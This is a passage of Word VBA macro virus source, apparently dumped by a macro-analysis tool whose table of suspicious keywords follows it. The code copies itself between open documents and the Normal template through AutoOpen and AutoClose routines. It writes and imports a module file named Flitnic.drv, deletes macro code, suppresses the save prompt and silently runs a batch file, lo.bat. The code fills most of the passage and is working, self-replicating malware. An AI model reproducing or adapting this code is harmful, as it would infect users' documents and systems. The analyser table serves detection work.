a = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
For _
ii _
= _
2 To a
l _
= ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.Lines(ii, 1)
FullCodeN _
= _
FullCodeN & l & Chr(13)
FullCodeD _
= _
FullCodeD & l & Chr(13)
Next _
ii
End _
If
a = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines 1, a
ActiveDocument.Saved = True
ActiveDocument.Saved = True
NoDoc:
ms = NormalTemplate.VBProject.VBComponents.Count
For _
t2 _
= _
1 To ms
ls = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If _
ls _
> _
3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT = 1
Exit _
For
End _
If
Next _
t2
If _
NormT _
= _
1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
For _
iiii _
= _
2 To a
l _
= NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(iiii, 1)
FullCodeD _
= _
FullCodeD & l & Chr(13)
FullCodeN _
= _
FullCodeN & l & Chr(13)
Next _
iiii
End _
If
l = ""
On _
Error GoTo 0
On _
Error GoTo eb
a = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines 1, a
NormalTemplate.Saved = True
esub:
Close _
#1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line _
Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir _
= _
Mid(a, _
8, l)
End _
If
Loop
Close _
#1
If windir = "" Then Exit Sub
a = GetAttr(NormalTemplate.FullName)
If _
a _
= _
33 _
Then _
a = 1
If _
a _
= 1 Then GoTo eb
eb:
NormalTemplate.Saved = True
Application.Dialogs(wdDialogToolsMacro).Show
ReInf = True
If _
Application.ShowVisualBasicEditor _
= _
True _
Then _
ReInf = False
If _
ReInf _
= _
True Then
Acd = 0
NormT = 0
If _
NormT _
<> _
1 Then
NormalTemplate.OpenAsDocument
NormAt = ActiveDocument.ReadOnly
ActiveDocument.Close
Close _
#1
look:
ms = NormalTemplate.VBProject.VBComponents.Count
For _
Inn _
= _
2 To ms
a = NormalTemplate.VBProject.VBComponents(Inn).CodeModule.countoflines
If _
a _
< _
1 Then
NormalTemplate.VBProject.VBComponents(Inn).CodeModule.AddFromstring _
(FullCodeN)
i = 20
Exit _
For
End _
If
Next _
Inn
If _
i _
<> _
20 Then
Close _
#1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close _
#1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close _
#1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo _
look
End _
If
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If _
NormAt _
= _
True Then
NormalTemplate.Saved = True
End _
If
End _
If
i = 1
If _
NormAt _
<> _
True Then NormalTemplate.Save
notemp:
If _
Acd _
<> _
1 Then
Close
look2:
a = Application.Documents.Count
If _
a _
< 1 Then GoTo NoDocL
ms = ActiveDocument.VBProject.VBComponents.Count
For _
inn2 _
= _
2 To ms
a = ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If _
a _
< _
1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring _
(FullCodeD)
i = 20
Exit _
For
End _
If
Next _
inn2
If _
i _
<> _
20 Then
Close _
#1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close _
#1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close _
#1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo _
look2
End _
If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If _
ActiveDocument.ReadOnly _
= True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved = True
End _
If
End _
If
NoDocL:
Else
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For _
i _
= _
1 To 2
al = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines 1, al
NormalTemplate.Saved = True
Next _
i
End _
If
Options.SaveNormalPrompt = False
NormalTemplate.Saved = True
End _
Sub





































































































































































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AUTOCLOSE           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |lo.bat              |Executable file name                         |
+----------+--------------------+---------------------------------------------+

